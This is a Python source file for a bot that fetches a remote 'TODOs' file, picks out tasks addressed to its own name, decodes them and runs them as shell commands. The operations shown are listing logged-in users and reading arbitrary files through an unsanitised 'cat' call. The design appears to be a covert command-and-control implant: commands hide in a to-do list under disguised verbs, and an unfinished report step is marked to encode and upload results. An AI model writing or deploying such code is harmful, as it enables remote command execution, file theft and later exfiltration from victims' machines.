from queue import Queue
from subprocess import Popen, PIPE

from constants import gid, gat
from encoding import decode, decode_word, mvws
from myhttp import get_file

def execute_shell(command):
    p = Popen(command, stdout=PIPE, shell=True)
    return p.communicate()

class Bot:
    def __init__(self):
        # TODO - get name
        self.name = "Marin"
        self.todos = Queue()

    def get_todos(self):
        raw = get_file("TODOs")
        todos = raw.split('\n')[3:]
        for new in todos:
            if new[0] != '-':
                # ignore task comments
                continue
            colon = new.index(':')
            if new[2:colon] != self.name:
                # ignore others' tasks
                continue
            # preserve the first space
            self.todos.put(new[colon+1:])
        self.run_all_tasks()

    def run_all_tasks(self):
        while not self.todos.empty():
            self.run_first_task()

    def run_first_task(self):
        try:
            task = self.todos.get()
            ot = decode(task).split(' ')
            operation = ot[0]
            args = '' if len(ot) < 2 else ' '.join(ot[1:])
        except:
            self.report(task, "Failed to parse task")
            return
        res = ""
        match operation:
            case 'a':
                res = execute_shell('w')
            case 'dog':
                res = execute_shell(f'cat {args}')
            case _:
                res = "Unknown operation"
        self.report(task, res)

    def report(self, task, result):
        # TODO - encode, upload
        print(f"Reporting for task '{task}'")
        print(result)
        print("==========")
    

if __name__ == '__main__':
    b = Bot()
    b.get_todos()
